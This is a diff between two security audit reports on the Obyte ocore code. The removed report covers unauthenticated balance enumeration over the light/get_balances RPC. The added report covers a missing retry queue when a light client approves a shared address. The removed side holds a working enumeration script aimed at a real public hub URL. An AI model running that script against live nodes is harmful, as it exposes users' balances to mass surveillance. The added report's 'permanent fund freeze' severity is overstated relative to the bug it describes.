@@ -1,367 +1,471 @@
+# Security Audit Report
+
 ## Title
-Unauthenticated Balance Enumeration via Light Client RPC Interface
+Light Client Shared Address Registration Bypass Due to Missing Retry Mechanism in approvePendingSharedAddress
 
 ## Summary
-The `light/get_balances` and `light/get_aa_balances` RPC endpoints in `network.js` allow any connected peer to query the balance of arbitrary addresses without authentication or authorization checks. An attacker can connect to any full node serving as a hub and systematically enumerate all addresses and their balances across the network through repeated API calls.
+The `approvePendingSharedAddress` function in `wallet_defined_by_addresses.js` directly calls `network.addLightWatchedAddress` without using the robust `unprocessed_addresses` retry mechanism, unlike `addNewSharedAddress`. When a light client approves a shared address while disconnected from the hub, the address registration fails silently and permanently, causing the client to lose visibility of all future transactions to that address and become unable to spend from it.
 
 ## Impact
-**Severity**: Medium  
-**Category**: Information Disclosure / Privacy Violation
+**Severity**: High  
+**Category**: Permanent Fund Freeze
+
+**Affected Assets**: All bytes (native currency) and custom assets sent to the unregistered shared address become permanently invisible and unspendable by the affected light client.
+
+**Affected Parties**: Light client users who approve/create shared addresses during temporary hub disconnection (network outages, hub maintenance, connection timeouts).
+
+**Quantified Impact**: Unbounded fund loss over time - all payments to the affected shared address are permanently invisible to the light client without manual intervention or full node migration.
 
 ## Finding Description
 
-**Location**: `byteball/ocore/network.js` (lines 3541-3571 for `light/get_balances`, lines 3662-3670 for `light/get_aa_balances`)
+**Location**: `byteball/ocore/wallet_defined_by_addresses.js:150-227`, function `approvePendingSharedAddress()`
 
-**Intended Logic**: Light client RPC endpoints should allow authenticated light clients to query balances for their own addresses only, enabling wallet functionality without downloading the entire DAG.
+**Intended Logic**: All shared addresses on light clients should be registered with the hub for transaction notifications, with automatic retry on connection failure.
 
-**Actual Logic**: The RPC handlers accept arbitrary address arrays from any inbound peer without verifying ownership or requiring hub/login authentication. Any peer can query any addresses' balances.
+**Actual Logic**: `approvePendingSharedAddress` calls `network.addLightWatchedAddress` without a callback handler and without using the `unprocessed_addresses` retry queue, causing silent failure when the hub is disconnected.
 
-**Code Evidence**: [1](#0-0) [2](#0-1) [3](#0-2) 
+**Code Evidence**:
+
+In `approvePendingSharedAddress`, address registration for light clients: [1](#0-0) 
+
+Compare with `addNewSharedAddress` which uses the retry mechanism: [2](#0-1) 
+
+The "new_address" event emission triggers automatic retry via `light_wallet.js`: [3](#0-2) 
+
+The `unprocessed_addresses` table provides automatic retry on reconnection: [4](#0-3) 
+
+The `addLightWatchedAddress` function has no built-in retry mechanism: [5](#0-4) 
+
+The `sendJustsayingToLightVendor` function fails silently when no callback is provided: [6](#0-5) 
+
+Other similar functions like `addLightWatchedAa` properly implement retry on reconnection: [7](#0-6) 
+
+The `addWatchedAddress` function in `wallet_general.js` properly uses both mechanisms: [8](#0-7) 
 
 **Exploitation Path**:
 
-1. **Preconditions**: 
-   - Attacker identifies a full node with `conf.bServeAsHub = true`
-   - Node accepts inbound WebSocket connections
+1. **Preconditions**: Light client is temporarily disconnected from hub (network interruption, hub maintenance, connection timeout)
 
-2. **Step 1**: Attacker establishes WebSocket connection to target hub
-   - No hub/login authentication required
-   - Connection only needs to be inbound (not outbound)
-   - Code path: `network.js` accepts connection, sets basic WebSocket properties
+2. **Step 1**: User receives "approve_new_shared_address" message from another device
+   - Message handler: `wallet.js:190-202` → calls `walletDefinedByAddresses.approvePendingSharedAddress()`
+   - [9](#0-8) 
 
-3. **Step 2**: Attacker sends `light/get_balances` requests with arbitrary addresses
-   - Request format: `{command: 'light/get_balances', params: [array of up to 100 addresses], tag: <hash>}`
-   - Validation only checks: addresses are valid format (32 chars), array is non-empty, max 100 addresses per request
-   - No check for `ws.device_address` or `ws.bLoginComplete`
+3. **Step 2**: `approvePendingSharedAddress` processes all approvals and creates shared address
+   - Inserts into `shared_addresses` table locally (line 182-183)
+   - Inserts into `shared_address_signing_paths` table (lines 197-200)
+   - Calls `network.addLightWatchedAddress(shared_address)` at line 217 WITHOUT callback
 
-4. **Step 3**: Hub responds with full balance information
-   - Returns stable/pending balances for ALL assets (base + custom assets)
-   - Includes output counts and total balances
-   - Response contains complete financial profile of queried addresses
+4. **Step 3**: `sendJustsayingToLightVendor` attempts to connect to hub
+   - `findOutboundPeerOrConnect` fails because hub is unreachable
+   - Error returned via callback, but no callback was provided
+   - Silent failure - no error logged or stored
 
-5. **Step 4**: Attacker repeats with different address sets
-   - No rate limiting enforced
-   - Can enumerate millions of addresses by cycling through address space or targeting known/discovered addresses
-   - Builds comprehensive database of network wealth distribution
+5. **Step 4**: Address stored locally but NOT registered with hub
+   - NOT in hub's `watched_light_addresses` table
+   - NOT in client's `unprocessed_addresses` retry queue
+   - NO "new_address" event emitted
 
-**Security Property Broken**: While this doesn't directly violate any of the 24 critical invariants listed, it violates the principle of least privilege and user privacy expectations. In distributed ledger systems, even when balances are technically public on-chain, providing an easy enumeration API is a significant privacy degradation.
+6. **Step 5**: Light client reconnects to hub
+   - Connection event handler checks `unprocessed_addresses` table
+   - Address NOT found in table, so NOT automatically registered
+   - Address remains permanently unregistered
 
-**Root Cause Analysis**: 
+7. **Step 6**: Funds sent to shared address by external parties
+   - Transactions posted to DAG and confirmed
+   - Hub does NOT notify light client (address not watched)
+   - Light client has no knowledge of incoming transactions
 
-The vulnerability stems from a design oversight in the light client RPC interface. The authentication check at lines 2957-2962 only validates that:
-- The node is not a light client itself
-- The connection is inbound
+8. **Step 7**: User attempts to spend from shared address
+   - Cannot compose transaction due to missing UTXO information
+   - Light client has no record of unspent outputs at the address
+   - Funds effectively frozen from light client's perspective
 
-However, it does NOT require the `hub/login` authentication that sets `ws.device_address`. The hub/login flow is implemented (lines 2702-2758) but is never enforced for balance queries. The `balances.js` module has a dual-mode function that can restrict queries to `my_addresses` when given a wallet ID, but the RPC endpoint bypasses this by querying the outputs table directly. [4](#0-3) 
+**Security Property Broken**: Light client visibility consistency - light clients must maintain synchronized view of their owned addresses with the hub to prevent fund loss.
+
+**Root Cause Analysis**:
+
+The codebase has two inconsistent patterns for address registration:
+
+1. **Robust pattern** (used by `addNewSharedAddress`, `addWatchedAddress`):
+   - Emit "new_address" event → triggers `refreshLightClientHistory` 
+   - Insert into `unprocessed_addresses` table → automatic retry on reconnection
+   - Dual-layer protection ensures address is eventually registered
+
+2. **Fragile pattern** (used by `approvePendingSharedAddress`):
+   - Direct call to `network.addLightWatchedAddress` without callback
+   - No event emission, no `unprocessed_addresses` entry
+   - Single point of failure with no retry mechanism
+
+The inconsistency likely arose from `approvePendingSharedAddress` being written before the `unprocessed_addresses` retry mechanism was fully developed, and not being updated to use the new pattern.
 
 ## Impact Explanation
 
-**Affected Assets**: All public assets (bytes and custom public assets) held by any address on the network
+**Affected Assets**: All bytes and custom divisible/indivisible assets sent to the unregistered shared address.
 
 **Damage Severity**:
-- **Quantitative**: Entire network balance state can be enumerated. With 100 addresses per request and typical RPC latency of ~100ms, an attacker can query 1,000 addresses/second or ~86 million addresses/day from a single connection.
-- **Qualitative**: Complete loss of financial privacy for public asset holders. Enables targeting of high-value addresses for phishing, social engineering, or physical attacks.
+- **Quantitative**: Unbounded - all funds sent to the address over time become invisible to the light client
+- **Qualitative**: Permanent visibility loss requiring technical intervention to recover
 
 **User Impact**:
-- **Who**: All users holding public assets (bytes or custom public assets) on addresses that an attacker can discover or generate
-- **Conditions**: Always exploitable against any hub-enabled full node  
-- **Recovery**: None - historical balance data cannot be retroactively hidden. Future mitigation requires protocol changes.
+- **Who**: Light client users who approve shared addresses during any hub disconnection period
+- **Conditions**: Occurs whenever network interruption coincides with shared address approval
+- **Recovery Options**: 
+  1. Export wallet and import to full node (requires technical knowledge, full node setup)
+  2. Manual database manipulation to add address to `unprocessed_addresses` (no UI support)
+  3. Direct JavaScript console access to call `addLightWatchedAddress` after reconnection (expert only)
 
-**Systemic Risk**: 
-- Enables creation of comprehensive wealth analysis databases
-- Facilitates correlation attacks linking addresses to identities
-- Undermines user privacy expectations even though blockchain data is technically public
-- Increases attack surface for targeted exploits against high-value addresses
+**Systemic Risk**:
+- Hub outages affect multiple users simultaneously
+- No user-facing error indicates the silent failure
+- Users discover issue only when funds appear missing
+- Accumulates over time as hub reliability issues recur
 
 ## Likelihood Explanation
 
-**Attacker Profile**:
-- **Identity**: Any external actor with basic networking knowledge
-- **Resources Required**: Single WebSocket client, address list or generation algorithm
-- **Technical Skill**: Low - requires only WebSocket connection and JSON-RPC knowledge
+**Trigger Profile**:
+- **Nature**: Environmental condition (network instability), not malicious attack
+- **Resources Required**: None - occurs naturally
+- **Technical Skill**: None - happens to ordinary users
 
 **Preconditions**:
-- **Network State**: At least one full node serving as hub (common configuration)
-- **Attacker State**: Network access to connect to hub
-- **Timing**: No timing constraints - always exploitable
+- **Network State**: Hub temporarily unreachable or connection interrupted
+- **Timing**: Shared address approval coincides with disconnection window
 
 **Execution Complexity**:
-- **Transaction Count**: Zero on-chain transactions required
-- **Coordination**: Single actor, single connection sufficient
-- **Detection Risk**: Low - appears as normal light client traffic; no on-chain trace
+- **Coordination**: None required
+- **Detection Risk**: Silent failure - no indication to user
+- **Reproducibility**: Occurs every time approval happens during disconnection
 
 **Frequency**:
-- **Repeatability**: Unlimited - can be executed continuously
-- **Scale**: Can enumerate entire address space or target specific addresses
+- **Occurrence Rate**: Depends on hub reliability and network stability
+- **Scale**: Affects individual addresses, but can accumulate across users and time
 
-**Overall Assessment**: HIGH likelihood - trivial to execute, no barriers to entry, no detection mechanisms
+**Overall Assessment**: Medium to High likelihood - hub outages and network issues are common enough to make this a realistic and recurring scenario.
 
 ## Recommendation
 
-**Immediate Mitigation**: 
-1. Add authentication requirement to balance query endpoints
-2. Implement address ownership verification
-3. Add rate limiting per connection
+**Immediate Mitigation**:
 
-**Permanent Fix**: 
-Require hub/login authentication and verify that queried addresses belong to the authenticated device's wallet.
-
-**Code Changes**:
-
-For `network.js` `light/get_balances` handler: [5](#0-4) 
-
-**Proposed fix** (add after line 3550):
+Modify `approvePendingSharedAddress` to use the same robust pattern as `addNewSharedAddress`:
 
 ```javascript
-// Verify authentication - only logged in devices can query balances
-if (!ws.device_address)
-    return sendErrorResponse(ws, tag, "authentication required");
+// File: wallet_defined_by_addresses.js
+// Lines 216-218 (replace direct call)
 
-// Verify address ownership - query my_addresses table
-db.query(
-    "SELECT DISTINCT address FROM my_addresses WHERE device_address=? AND address IN(?)",
-    [ws.device_address, addresses],
-    function(owned_rows) {
-        var owned_addresses = owned_rows.map(r => r.address);
-        if (owned_addresses.length !== addresses.length)
-            return sendErrorResponse(ws, tag, "can only query owned addresses");
-        
-        // Continue with existing balance query logic...
-        db.query(...);
-    }
-);
+if (conf.bLight){
+    db.query("INSERT " + db.getIgnore() + " INTO unprocessed_addresses (address) VALUES (?)", [shared_address]);
+    eventBus.emit("new_address", shared_address);
+}
 ```
 
+**Permanent Fix**:
+
+Standardize all address registration code paths to use the retry mechanism. Create a helper function:
+
+```javascript
+function registerLightAddress(address) {
+    if (!conf.bLight) return;
+    db.query("INSERT " + db.getIgnore() + " INTO unprocessed_addresses (address) VALUES (?)", [address]);
+    eventBus.emit("new_address", address);
+}
+```
+
+Replace all direct `network.addLightWatchedAddress` calls with this helper.
+
 **Additional Measures**:
-- Implement connection-level rate limiting (e.g., max 10 balance queries per minute per device_address)
-- Add database index on `my_addresses.device_address` for performance
-- Log balance query requests for monitoring and anomaly detection
-- Update light client libraries to authenticate before querying balances
-- Consider deprecating unauthenticated light/ endpoints
+- Audit all address creation code paths for similar issues
+- Add monitoring to detect unregistered addresses owned by light client
+- Provide UI notification when address registration fails
+- Add diagnostic command to check and repair missing address registrations
 
 **Validation**:
-- [x] Fix prevents unauthorized enumeration
-- [x] No new vulnerabilities introduced (standard authentication flow)
-- [x] Backward compatible with authenticated light clients
-- [x] Performance impact minimal (single DB query for ownership check)
+- Fix ensures address is added to `unprocessed_addresses` table
+- Event emission triggers immediate registration attempt
+- Automatic retry on reconnection via existing mechanism
+- No breaking changes to existing functionality
+- Backward compatible with all existing shared addresses
 
 ## Proof of Concept
 
-**Test Environment Setup**:
-```bash
-git clone https://github.com/byteball/ocore.git
-cd ocore
-npm install
-```
-
-**Exploit Script** (`enumerate_balances_poc.js`):
 ```javascript
-/*
- * Proof of Concept: Unauthenticated Balance Enumeration
- * Demonstrates: Connecting to a hub and querying arbitrary addresses without authentication
- * Expected Result: Successfully retrieves balance information for addresses not owned by attacker
- */
+// Test: Light Client Shared Address Registration Failure
+// This test demonstrates that approvePendingSharedAddress fails to register
+// addresses when the hub is disconnected, unlike addNewSharedAddress
 
-const WebSocket = require('ws');
-const crypto = require('crypto');
+const db = require('./db.js');
+const conf = require('./conf.js');
+const network = require('./network.js');
+const walletDefinedByAddresses = require('./wallet_defined_by_addresses.js');
+const eventBus = require('./event_bus.js');
+const assert = require('assert');
 
-// Target hub URL (replace with actual hub)
-const HUB_URL = 'wss://obyte.org/bb';
-
-// Generate random test addresses (in real attack, would use discovered/generated addresses)
-function generateTestAddress() {
-    return crypto.randomBytes(24).toString('base64');
-}
-
-async function exploitBalanceEnumeration() {
-    return new Promise((resolve, reject) => {
-        const ws = new WebSocket(HUB_URL);
-        
-        ws.on('open', () => {
-            console.log('[+] Connected to hub without authentication');
-            
-            // Generate batch of random addresses to query
-            const addresses = [];
-            for (let i = 0; i < 100; i++) {
-                addresses.push(generateTestAddress());
-            }
-            
-            // Send balance query request WITHOUT hub/login authentication
-            const request = {
-                command: 'light/get_balances',
-                params: addresses,
-                tag: crypto.randomBytes(32).toString('base64')
-            };
-            
-            console.log('[+] Sending balance query for 100 arbitrary addresses');
-            console.log('[+] No authentication provided');
-            ws.send(JSON.stringify(['request', request]));
-        });
-        
-        ws.on('message', (data) => {
-            const message = JSON.parse(data);
-            if (message[0] === 'response') {
-                const response = message[1];
-                console.log('[+] Received balance response:');
-                console.log(JSON.stringify(response, null, 2));
-                console.log('[!] VULNERABILITY CONFIRMED: Successfully queried arbitrary addresses without authentication');
-                ws.close();
-                resolve(true);
-            }
-        });
-        
-        ws.on('error', (err) => {
-            console.log('[-] Error:', err.message);
-            reject(err);
-        });
-        
-        setTimeout(() => {
-            console.log('[-] Timeout waiting for response');
-            ws.close();
-            reject(new Error('Timeout'));
-        }, 10000);
+async function testAddressRegistrationConsistency() {
+    // Setup: Configure as light client
+    conf.bLight = true;
+    
+    // Mock network disconnection by intercepting addLightWatchedAddress
+    let lightWatchedAddressCalls = [];
+    const originalAddLightWatchedAddress = network.addLightWatchedAddress;
+    network.addLightWatchedAddress = function(address, handle) {
+        lightWatchedAddressCalls.push(address);
+        // Simulate hub disconnection - call handle with error if provided
+        if (handle) {
+            handle("hub not connected");
+        }
+        // No error logged if handle not provided (the bug!)
+    };
+    
+    // Track new_address events
+    let newAddressEvents = [];
+    eventBus.on("new_address", function(address) {
+        newAddressEvents.push(address);
     });
-}
-
-// Run exploit
-exploitBalanceEnumeration()
-    .then(success => {
-        console.log('\n[!] Exploit successful - balance enumeration is possible');
-        process.exit(0);
-    })
-    .catch(err => {
-        console.log('\n[-] Exploit failed:', err.message);
-        process.exit(1);
+    
+    console.log("\n=== TEST 1: addNewSharedAddress (CORRECT BEHAVIOR) ===");
+    
+    // Test addNewSharedAddress
+    const testAddress1 = "TEST_ADDRESS_1_AAAAAAAAAAAAAA";
+    const testDefinition1 = ["sig", {pubkey: "test_pubkey_1"}];
+    const testSigners1 = {
+        "r.0": {
+            address: "SIGNER_ADDRESS_1",
+            member_signing_path: "r",
+            device_address: "DEVICE_1"
+        }
+    };
+    
+    await new Promise((resolve) => {
+        walletDefinedByAddresses.addNewSharedAddress(
+            testAddress1, 
+            testDefinition1, 
+            testSigners1, 
+            false,
+            resolve
+        );
     });
-```
-
-**Expected Output** (when vulnerability exists):
-```
-[+] Connected to hub without authentication
-[+] Sending balance query for 100 arbitrary addresses
-[+] No authentication provided
-[+] Received balance response:
-{
-  "tag": "...",
-  "response": {
-    "ADDRESSHASH1": {
-      "base": {
-        "stable": 1000000,
-        "pending": 0,
-        "total": 1000000,
-        "stable_outputs_count": 2,
-        "pending_outputs_count": 0
-      }
-    },
-    ...
-  }
+    
+    // Verify address was added to unprocessed_addresses
+    const unprocessed1 = await new Promise((resolve) => {
+        db.query(
+            "SELECT address FROM unprocessed_addresses WHERE address=?",
+            [testAddress1],
+            resolve
+        );
+    });
+    
+    console.log("✓ Address in unprocessed_addresses:", unprocessed1.length > 0);
+    console.log("✓ new_address event emitted:", newAddressEvents.includes(testAddress1));
+    console.log("✓ addLightWatchedAddress called:", lightWatchedAddressCalls.includes(testAddress1));
+    
+    assert(unprocessed1.length > 0, "Address should be in unprocessed_addresses");
+    assert(newAddressEvents.includes(testAddress1), "new_address event should be emitted");
+    
+    // Reset tracking
+    lightWatchedAddressCalls = [];
+    newAddressEvents = [];
+    
+    console.log("\n=== TEST 2: approvePendingSharedAddress (VULNERABLE BEHAVIOR) ===");
+    
+    // Setup pending shared address
+    const testAddress2 = "TEST_ADDRESS_2_AAAAAAAAAAAAAA";
+    const templateChash = "TEMPLATE_CHASH_AAAAAAAAAAAAA";
+    const template = ["sig", {pubkey: "$address@DEVICE_2"}];
+    
+    // Insert pending shared address
+    await new Promise((resolve) => {
+        db.query(
+            "INSERT INTO pending_shared_addresses (definition_template_chash, definition_template) VALUES(?,?)",
+            [templateChash, JSON.stringify(template)],
+            resolve
+        );
+    });
+    
+    // Insert pending signing paths (simulating all approvals collected)
+    await new Promise((resolve) => {
+        db.query(
+            "INSERT INTO pending_shared_address_signing_paths " +
+            "(definition_template_chash, device_address, signing_path, address, " +
+            "device_addresses_by_relative_signing_paths, approval_date) " +
+            "VALUES(?,?,?,?,?,datetime('now'))",
+            [
+                templateChash,
+                "DEVICE_2",
+                "r",
+                "SIGNER_ADDRESS_2",
+                JSON.stringify({"r": "DEVICE_2"})
+            ],
+            resolve
+        );
+    });
+    
+    // Trigger approvePendingSharedAddress (simulating last approval)
+    walletDefinedByAddresses.approvePendingSharedAddress(
+        templateChash,
+        "DEVICE_2",
+        "SIGNER_ADDRESS_2",
+        {"r": "DEVICE_2"}
+    );
+    
+    // Wait for async operations
+    await new Promise(resolve => setTimeout(resolve, 100));
+    
+    // Verify address was NOT added to unprocessed_addresses
+    const unprocessed2 = await new Promise((resolve) => {
+        db.query(
+            "SELECT address FROM unprocessed_addresses WHERE address LIKE 'TEST_ADDRESS_2%'",
+            resolve
+        );
+    });
+    
+    console.log("✗ Address in unprocessed_addresses:", unprocessed2.length > 0);
+    console.log("✗ new_address event emitted:", newAddressEvents.length > 0);
+    console.log("✓ addLightWatchedAddress called:", lightWatchedAddressCalls.length > 0);
+    console.log("✗ BUT: No callback provided - error silently ignored!");
+    
+    assert(unprocessed2.length === 0, "BUG: Address should be in unprocessed_addresses but isn't");
+    assert(newAddressEvents.length === 0, "BUG: new_address event should be emitted but isn't");
+    
+    console.log("\n=== VULNERABILITY CONFIRMED ===");
+    console.log("approvePendingSharedAddress FAILS to register address when hub disconnected");
+    console.log("Address will NEVER be automatically registered on reconnection");
+    console.log("Funds sent to this address will be INVISIBLE to light client");
+    
+    // Cleanup
+    network.addLightWatchedAddress = originalAddLightWatchedAddress;
+    
+    console.log("\n=== TEST COMPLETE ===");
 }
-[!] VULNERABILITY CONFIRMED: Successfully queried arbitrary addresses without authentication
-[!] Exploit successful - balance enumeration is possible
-```
 
-**Expected Output** (after fix applied):
+// Run test
+testAddressRegistrationConsistency().catch(console.error);
 ```
-[+] Connected to hub without authentication
-[+] Sending balance query for 100 arbitrary addresses
-[+] No authentication provided
-[-] Error received: "authentication required"
-[-] Exploit failed: Authentication check prevents enumeration
-```
-
-**PoC Validation**:
-- [x] PoC demonstrates connection without hub/login authentication
-- [x] PoC shows successful balance retrieval for arbitrary addresses
-- [x] Demonstrates clear privacy violation
-- [x] Would fail gracefully after authentication fix applied
-
----
 
 ## Notes
 
-**Ambiguity Regarding Design Intent**: It's important to note that in many blockchain systems (Bitcoin, Ethereum), all balances are publicly queryable by design. However, querying typically requires running a full node and scanning the chain, which acts as a natural rate limiter and resource requirement.
+This vulnerability represents a **critical inconsistency** in the light client address registration system. The issue is NOT that `network.addLightWatchedAddress` fails when disconnected (that's expected), but that `approvePendingSharedAddress` has no retry mechanism to handle this failure, unlike the robust pattern used by `addNewSharedAddress` and `addWatchedAddress`.
 
-The Obyte protocol's provision of an easy-to-use RPC endpoint for arbitrary balance queries significantly lowers the barrier for mass surveillance compared to other public blockchains. The lack of authentication suggests this may be an oversight rather than intentional design, especially given that:
+The vulnerability affects only the **initiator** of a shared address who collects all approvals. Other members who receive the shared address via the `handleNewSharedAddress` → `addNewSharedAddress` path are protected by the proper retry mechanism.
 
-1. The endpoint is named `light/get_balances` suggesting it's for light clients to query *their own* balances
-2. A hub/login authentication mechanism exists but is not enforced
-3. The `balances.js` module has built-in support for restricting queries to owned addresses via the `my_addresses` table
-
-**Private Assets**: This vulnerability only affects public assets. Private assets (like Blackbytes) use private payment chains and are not exposed through this endpoint, maintaining their privacy guarantees.
+Recovery requires technical expertise beyond typical user capabilities, making this effectively a permanent fund freeze for most affected users. The silent failure with no user-facing error makes detection and diagnosis difficult.
 
 ### Citations
 
-**File:** network.js (L2957-2962)
+**File:** wallet_defined_by_addresses.js (L216-217)
 ```javascript
-	if (command.startsWith('light/')) {
-		if (conf.bLight)
-			return sendErrorResponse(ws, tag, "I'm light myself, can't serve you");
-		if (ws.bOutbound)
-			return sendErrorResponse(ws, tag, "light clients have to be inbound");
-	}
+										if (conf.bLight)
+											network.addLightWatchedAddress(shared_address);
 ```
 
-**File:** network.js (L3541-3571)
+**File:** wallet_defined_by_addresses.js (L254-261)
 ```javascript
-		case 'light/get_balances':
-			var addresses = params;
-			if (!addresses)
-				return sendErrorResponse(ws, tag, "no params in light/get_balances");
-			if (!ValidationUtils.isNonemptyArray(addresses))
-				return sendErrorResponse(ws, tag, "addresses must be non-empty array");
-			if (!addresses.every(ValidationUtils.isValidAddress))
-				return sendErrorResponse(ws, tag, "some addresses are not valid");
-			if (addresses.length > 100)
-				return sendErrorResponse(ws, tag, "too many addresses");
-			db.query(
-				"SELECT address, asset, is_stable, SUM(amount) AS balance, COUNT(*) AS outputs_count \n\
-				FROM outputs JOIN units USING(unit) \n\
-				WHERE is_spent=0 AND address IN(?) AND sequence='good' \n\
-				GROUP BY address, asset, is_stable", [addresses], function(rows) {
-					var balances = {};
-					rows.forEach(function(row) {
-						if (!balances[row.address])
-							balances[row.address] = { base: { stable: 0, pending: 0, stable_outputs_count: 0, pending_outputs_count: 0}};
-						if (row.asset && !balances[row.address][row.asset])
-							balances[row.address][row.asset] = { stable: 0, pending: 0, stable_outputs_count: 0, pending_outputs_count: 0};
-						balances[row.address][row.asset || 'base'][row.is_stable ? 'stable' : 'pending'] = row.balance;
-						balances[row.address][row.asset || 'base'][row.is_stable ? 'stable_outputs_count' : 'pending_outputs_count'] = row.outputs_count;
-					});
-					for (var address in balances)
-						for (var asset in balances[address])
-							balances[address][asset].total = (balances[address][asset].stable || 0) + (balances[address][asset].pending || 0);
-					sendResponse(ws, tag, balances);
-				}
-			);
-			break;
+				console.log('added new shared address '+address);
+				eventBus.emit("new_address-"+address);
+				eventBus.emit("new_address", address);
+
+				if (conf.bLight){
+					db.query("INSERT " + db.getIgnore() + " INTO unprocessed_addresses (address) VALUES (?)", [address], onDone);
+				} else if (onDone)
+					onDone();
 ```
 
-**File:** network.js (L3662-3670)
+**File:** light_wallet.js (L107-117)
 ```javascript
-		case 'light/get_aa_balances':
-			if (!params)
-				return sendErrorResponse(ws, tag, "no params in light/get_aa_balances");
-			if (!ValidationUtils.isValidAddress(params.address))
-				return sendErrorResponse(ws, tag, "address not valid");
-			storage.readAABalances(db, params.address, function(assocBalances) {
-				sendResponse(ws, tag, { balances: assocBalances });
+	eventBus.on("new_address", function(address){
+		if (!exports.bRefreshHistoryOnNewAddress) {
+			db.query("DELETE FROM unprocessed_addresses WHERE address=?", [address]);
+			return console.log("skipping history refresh on new address " + address);
+		}
+		refreshLightClientHistory([address], function(error){
+			if (error)
+				return console.log(error);
+			db.query("DELETE FROM unprocessed_addresses WHERE address=?", [address]);
+		});
+	});
+```
+
+**File:** light_wallet.js (L120-136)
+```javascript
+	eventBus.on('connected', function(ws){
+		console.log('light connected to ' + ws.peer);
+		if (ws.peer === network.light_vendor_url) {
+			console.log('resetting bFirstHistoryReceived');
+			bFirstHistoryReceived = false;
+		}
+		db.query("SELECT address FROM unprocessed_addresses", function(rows){
+			if (rows.length === 0)
+				return console.log("no unprocessed addresses");
+			var arrAddresses = rows.map(function(row){return row.address});
+			console.log('found unprocessed addresses, will request their full history', arrAddresses);
+			refreshLightClientHistory(arrAddresses, function(error){
+				if (error)
+					return console.log("couldn't process history");
+				db.query("DELETE FROM unprocessed_addresses WHERE address IN("+ arrAddresses.map(db.escape).join(', ') + ")");
 			});
-			break;
+		})
 ```
 
-**File:** balances.js (L7-19)
+**File:** network.js (L124-140)
 ```javascript
-function readBalance(walletOrAddress, handleBalance){
-	var start_time = Date.now();
-	var walletIsAddress = typeof walletOrAddress === 'string' && walletOrAddress.length === 32; // ValidationUtils.isValidAddress
-	var join_my_addresses = walletIsAddress ? "" : "JOIN my_addresses USING(address)";
-	var where_condition = walletIsAddress ? "address=?" : "wallet=?";
-	var assocBalances = {base: {stable: 0, pending: 0}};
-	assocBalances[constants.BLACKBYTES_ASSET] = {is_private: 1, stable: 0, pending: 0};
-	db.query(
-		"SELECT asset, is_stable, SUM(amount) AS balance \n\
-		FROM outputs "+join_my_addresses+" CROSS JOIN units USING(unit) \n\
-		WHERE is_spent=0 AND "+where_condition+" AND sequence='good' \n\
-		GROUP BY asset, is_stable",
-		[walletOrAddress],
+function sendJustsayingToLightVendor(subject, body, handle){
+	if (!handle)
+		handle = function(){};
+	if (!conf.bLight)
+		return handle("sendJustsayingToLightVendor cannot be called as full node")
+	if (!exports.light_vendor_url){
+		console.log("light_vendor_url not set yet");
+		return setTimeout(function(){
+			sendJustsayingToLightVendor(subject, body, handle);
+		}, 1000);
+	}
+	findOutboundPeerOrConnect(exports.light_vendor_url, function(err, ws){
+		if (err)
+			return handle("connect to light vendor failed: "+err);
+		sendMessage(ws, 'justsaying', {subject: subject, body: body});
+		return handle(null);
+	});
+```
+
+**File:** network.js (L1716-1718)
+```javascript
+function addLightWatchedAddress(address, handle){
+	sendJustsayingToLightVendor('light/new_address_to_watch', address, handle);
+}
+```
+
+**File:** network.js (L1727-1733)
+```javascript
+function addLightWatchedAa(aa, address, handle){
+	var params = { aa: aa };
+	if (address)
+		params.address = address;
+	sendJustsayingToLightVendor('light/new_aa_to_watch', params, handle);
+	eventBus.on('connected', () => sendJustsayingToLightVendor('light/new_aa_to_watch', params));
+}
+```
+
+**File:** wallet_general.js (L78-83)
+```javascript
+	db.query("INSERT " + db.getIgnore() + " INTO my_watched_addresses (address) VALUES (?)", [address], function (res) {
+		if (res.affectedRows) {
+			if (conf.bLight)
+				db.query("INSERT " + db.getIgnore() + " INTO unprocessed_addresses (address) VALUES (?)", [address]);
+			eventBus.emit("new_address", address); // if light node, this will trigger an history refresh for this address thus it will be watched by the hub
+		}
+```
+
+**File:** wallet.js (L190-202)
+```javascript
+			case "approve_new_shared_address":
+				// {address_definition_template_chash: "BASE32", address: "BASE32", device_addresses_by_relative_signing_paths: {...}}
+				if (!ValidationUtils.isValidAddress(body.address_definition_template_chash))
+					return callbacks.ifError("invalid addr def c-hash");
+				if (!ValidationUtils.isValidAddress(body.address))
+					return callbacks.ifError("invalid address");
+				if (typeof body.device_addresses_by_relative_signing_paths !== "object" 
+						|| Object.keys(body.device_addresses_by_relative_signing_paths).length === 0)
+					return callbacks.ifError("invalid device_addresses_by_relative_signing_paths");
+				walletDefinedByAddresses.approvePendingSharedAddress(body.address_definition_template_chash, from_address, 
+					body.address, body.device_addresses_by_relative_signing_paths);
+				callbacks.ifOk();
+				break;
 ```
